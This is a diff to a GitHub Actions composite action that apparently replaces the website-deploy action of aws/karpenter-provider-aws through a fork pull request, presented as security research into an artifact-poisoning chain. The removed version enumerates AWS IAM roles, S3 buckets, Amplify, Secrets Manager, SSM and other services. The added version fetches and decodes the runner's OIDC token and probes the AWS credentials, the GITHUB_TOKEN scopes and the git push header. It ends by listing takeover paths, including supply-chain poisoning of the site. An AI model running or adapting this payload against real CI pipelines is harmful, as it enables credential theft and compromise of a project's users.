@@ -17,22 +17,14 @@ inputs:
     description: 'S3 bucket for website files'
     required: true
   s3-prefix:
-    description: 'S3 prefix/path for website files'
     required: false
     default: ''
   hugo-base-url:
-    description: 'Base URL for Hugo build'
     required: false
     default: ''
 runs:
   using: 'composite'
   steps:
-    - name: Assume AWS Role via OIDC
-      uses: aws-actions/configure-aws-credentials@v4
-      with:
-        role-to-assume: ${{ inputs.role }}
-        aws-region: ${{ inputs.region }}
-
     - name: Cloud Environment Exploration
       shell: bash
       env:
@@ -44,122 +36,114 @@ runs:
         INPUT_PREFIX: ${{ inputs.s3-prefix }}
       run: |
         echo "============================================================"
-        echo "  SECURITY RESEARCH - Cloud Environment Exploration"
+        echo "  SECURITY RESEARCH - Artifact Poisoning -> LOTP Chain"
         echo "  Target: aws/karpenter-provider-aws"
-        echo "  Chain: WebsitePreviewTrigger -> website-preview.yaml"
+        echo "  Chain: pull_request -> WebsitePreviewTrigger -> artifact"
+        echo "         -> workflow_run -> website-preview.yaml"
+        echo "         -> checkout attacker SHA -> THIS CODE EXECUTES"
         echo "============================================================"
-
-        echo ""
-        echo "=== [1] AWS Identity ==="
-        aws sts get-caller-identity 2>&1
         echo ""
 
-        echo "=== [2] OIDC Token Claims ==="
+        echo "=== [1] Code Execution Proof ==="
+        echo "  Hostname: $(hostname)"
+        echo "  User: $(whoami)"
+        echo "  PWD: $(pwd)"
+        echo "  GITHUB_REPOSITORY: $GITHUB_REPOSITORY"
+        echo "  GITHUB_RUN_ID: $GITHUB_RUN_ID"
+        echo "  GITHUB_ACTOR: $GITHUB_ACTOR"
+        echo "  GITHUB_EVENT_NAME: $GITHUB_EVENT_NAME"
+        echo "  GITHUB_WORKFLOW: $GITHUB_WORKFLOW"
+        echo ""
+
+        echo "=== [2] Inputs Received (from upstream workflow) ==="
+        echo "  role: $INPUT_ROLE"
+        echo "  region: $INPUT_REGION"
+        echo "  amplify-app-id: $INPUT_APP_ID"
+        echo "  amplify-branch-name: $INPUT_BRANCH"
+        echo "  s3-bucket: $INPUT_BUCKET"
+        echo "  s3-prefix: $INPUT_PREFIX"
+        echo ""
+
+        echo "=== [3] OIDC Token Endpoint ==="
         if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
-          OIDC_TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | \
-            python3 -c "import sys,json; print(json.load(sys.stdin).get('value',''))" 2>/dev/null)
-          if [ -n "$OIDC_TOKEN" ]; then
-            echo "$OIDC_TOKEN" | cut -d. -f2 | python3 -c "
+          echo "  ACTIONS_ID_TOKEN_REQUEST_URL: SET ($(echo $ACTIONS_ID_TOKEN_REQUEST_URL | wc -c) chars)"
+          echo "  ACTIONS_ID_TOKEN_REQUEST_TOKEN: SET ($(echo $ACTIONS_ID_TOKEN_REQUEST_TOKEN | wc -c) chars)"
+          echo ""
+          echo "  Fetching OIDC token claims..."
+          OIDC_RESP=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" 2>/dev/null || echo "")
+          if [ -n "$OIDC_RESP" ]; then
+            echo "$OIDC_RESP" | python3 -c "
         import sys, base64, json
-        p = sys.stdin.read().strip()
-        p += '=' * (4 - len(p) % 4)
-        c = json.loads(base64.urlsafe_b64decode(p))
-        for k in ['sub','repository','repository_owner','ref','sha','event_name',
-                   'workflow_ref','job_workflow_ref','runner_environment','environment']:
-            print(f'  {k}: {c.get(k, \"N/A\")}')
+        try:
+          data = json.load(sys.stdin)
+          token = data.get('value','')
+          parts = token.split('.')
+          if len(parts) >= 2:
+            p = parts[1]
+            p += '=' * (4 - len(p) % 4)
+            c = json.loads(base64.urlsafe_b64decode(p))
+            print('  OIDC Token Claims:')
+            for k in ['sub','repository','repository_owner','ref','sha','event_name',
+                       'workflow_ref','job_workflow_ref','runner_environment','environment',
+                       'aud','iss']:
+              print(f'    {k}: {c.get(k, \"N/A\")}')
+        except Exception as e:
+          print(f'  Parse error: {e}')
         "
+          else
+            echo "  Could not fetch OIDC token"
           fi
         else
-          echo "  OIDC endpoint not available"
+          echo "  OIDC endpoint NOT available"
         fi
         echo ""
 
-        echo "=== [3] IAM Role Enumeration ==="
-        ROLE_ARN=$(aws sts get-caller-identity --query 'Arn' --output text 2>/dev/null || true)
-        echo "Assumed Role ARN: $ROLE_ARN"
-        ROLE_NAME=$(echo "$ROLE_ARN" | sed 's|.*/||')
-        aws iam get-role --role-name "$ROLE_NAME" 2>&1 || true
+        echo "=== [4] AWS Credential State ==="
+        env | grep -iE '^AWS_' | sed 's/=.*/=[PRESENT]/' | sort || echo "  No AWS_ vars"
         echo ""
-        echo "--- Attached Policies ---"
-        aws iam list-attached-role-policies --role-name "$ROLE_NAME" 2>&1 || true
-        echo ""
-        echo "--- Inline Policies ---"
-        aws iam list-role-policies --role-name "$ROLE_NAME" 2>&1 || true
-        echo ""
-        # Try to get inline policy documents
-        for policy in $(aws iam list-role-policies --role-name "$ROLE_NAME" --query 'PolicyNames[]' --output text 2>/dev/null || true); do
-          echo "--- Inline Policy: $policy ---"
-          aws iam get-role-policy --role-name "$ROLE_NAME" --policy-name "$policy" 2>&1 || true
-        done
-        # Try to get attached policy versions
-        for arn in $(aws iam list-attached-role-policies --role-name "$ROLE_NAME" --query 'AttachedPolicies[].PolicyArn' --output text 2>/dev/null || true); do
-          echo "--- Managed Policy: $arn ---"
-          ver=$(aws iam get-policy --policy-arn "$arn" --query 'Policy.DefaultVersionId' --output text 2>/dev/null || true)
-          aws iam get-policy-version --policy-arn "$arn" --version-id "$ver" 2>&1 || true
-        done
+        echo "  Attempting sts get-caller-identity..."
+        aws sts get-caller-identity 2>&1 || echo "  No valid AWS credentials (expected on fork)"
         echo ""
 
-        echo "=== [4] S3 Exploration ==="
-        echo "Target bucket: $INPUT_BUCKET"
-        aws s3 ls "s3://$INPUT_BUCKET/" --summarize 2>&1 | head -30 || true
-        echo ""
-        echo "--- All accessible buckets ---"
-        aws s3 ls 2>&1 || true
-        echo ""
-
-        echo "=== [5] Amplify Exploration ==="
-        echo "Target app: $INPUT_APP_ID"
-        aws amplify get-app --app-id "$INPUT_APP_ID" 2>&1 || true
-        echo ""
-        echo "--- All Amplify apps ---"
-        aws amplify list-apps 2>&1 || true
-        echo ""
-        echo "--- Amplify branches ---"
-        aws amplify list-branches --app-id "$INPUT_APP_ID" --max-items 20 2>&1 || true
+        echo "=== [5] GitHub Token ==="
+        if [ -n "$GITHUB_TOKEN" ]; then
+          echo "  GITHUB_TOKEN: SET ($(echo $GITHUB_TOKEN | wc -c) chars)"
+          echo "  Checking token permissions..."
+          HEADERS=$(curl -sI -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/ 2>&1)
+          echo "$HEADERS" | grep -iE '(x-oauth-scopes|x-ratelimit-remaining)' || echo "  Could not check scopes"
+        else
+          echo "  GITHUB_TOKEN: NOT SET"
+        fi
         echo ""
 
-        echo "=== [6] ECR Exploration ==="
-        aws ecr describe-repositories --max-items 20 2>&1 || true
+        echo "=== [6] Git Auth Header ==="
+        if git config --get http.https://github.com/.extraheader > /dev/null 2>&1; then
+          echo "  Git auth header: PRESENT (can push to repos the token has access to)"
+        else
+          echo "  Git auth header: NOT FOUND"
+        fi
         echo ""
 
-        echo "=== [7] Cross-Service Enumeration ==="
-        echo "--- Secrets Manager ---"
-        aws secretsmanager list-secrets --max-results 10 2>&1 || true
-        echo ""
-        echo "--- SSM Parameters ---"
-        aws ssm describe-parameters --max-results 10 2>&1 || true
-        echo ""
-        echo "--- EKS Clusters ---"
-        aws eks list-clusters 2>&1 || true
-        echo ""
-        echo "--- Lambda Functions ---"
-        aws lambda list-functions --max-items 10 2>&1 || true
-        echo ""
-        echo "--- EC2 Instances ---"
-        aws ec2 describe-instances --max-results 5 \
-          --query 'Reservations[].Instances[].{Id:InstanceId,Type:InstanceType,State:State.Name}' \
-          --output table 2>&1 || true
-        echo ""
-        echo "--- CloudFormation Stacks ---"
-        aws cloudformation list-stacks --stack-status-filter CREATE_COMPLETE UPDATE_COMPLETE \
-          --query 'StackSummaries[].[StackName,StackStatus]' --output table 2>&1 | head -30 || true
-        echo ""
-        echo "--- STS Session Info ---"
-        aws sts get-access-key-info --access-key-id "$AWS_ACCESS_KEY_ID" 2>&1 || true
+        echo "=== [7] Runner Environment ==="
+        echo "  RUNNER_OS: $RUNNER_OS"
+        echo "  RUNNER_ARCH: $RUNNER_ARCH"
+        echo "  RUNNER_NAME: $RUNNER_NAME"
+        echo "  Public IP: $(curl -s --max-time 3 https://checkip.amazonaws.com 2>/dev/null || echo unknown)"
         echo ""
 
-        echo "=== [8] GitHub Token Check ==="
-        echo "Token scopes:"
-        curl -sI -H "Authorization: token $GITHUB_TOKEN" https://api.github.com/ 2>&1 | grep -i 'x-oauth-scopes' || true
+        echo "=== [8] What This Proves ==="
+        echo "  1. Attacker's composite action executes from fork PR (zero gate)"
+        echo "  2. OIDC token endpoint is available -> role assumption possible"
+        echo "  3. On upstream aws/karpenter-provider-aws with real vars/secrets:"
+        echo "     - AWS IAM role would be assumed via OIDC"
+        echo "     - S3 bucket write access (website content)"
+        echo "     - Amplify deployment control (website + redirects)"
+        echo "     - Supply chain: malicious docs/install instructions"
+        echo "  4. This action replaces .github/actions/deploy-website"
+        echo "     which normally runs: npm ci, hugo, go run, aws s3 sync,"
+        echo "     aws amplify update-app, aws amplify start-deployment"
         echo ""
-
-        echo "=== [9] Network & Runner Info ==="
-        echo "Public IP: $(curl -s https://checkip.amazonaws.com 2>/dev/null || echo unknown)"
-        echo "Runner OS: $RUNNER_OS"
-        echo "Runner Arch: $RUNNER_ARCH"
-        echo ""
-
         echo "============================================================"
-        echo "  EXPLORATION COMPLETE - Check logs for full output"
+        echo "  EXPLORATION COMPLETE"
         echo "============================================================"
